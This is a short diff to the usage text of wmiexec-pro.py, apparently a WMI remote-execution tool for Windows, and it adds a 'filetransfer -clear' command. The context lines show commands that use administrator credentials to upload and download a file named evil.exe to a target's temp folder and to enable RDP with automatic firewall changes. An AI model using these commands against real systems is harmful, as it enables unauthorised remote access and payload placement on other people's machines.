@@ -86,6 +86,7 @@ Execute command:
 Filetransfer:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 filetransfer -upload -src-file "./evil.exe" -dest-file "C:\windows\temp\evil.exe" (Upload file over 512KB)
    python3 wmiexec-pro.py administrator:password@192.168.1.1 filetransfer -download -src-file "C:\windows\temp\evil.exe" -dest-file "/tmp/evil.exe" (download file over 512KB)
+   python3 wmiexec-pro.py administrator:password@192.168.1.1 filetransfer -clear
    
 RDP:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 rdp -enable (Auto configure firewall)
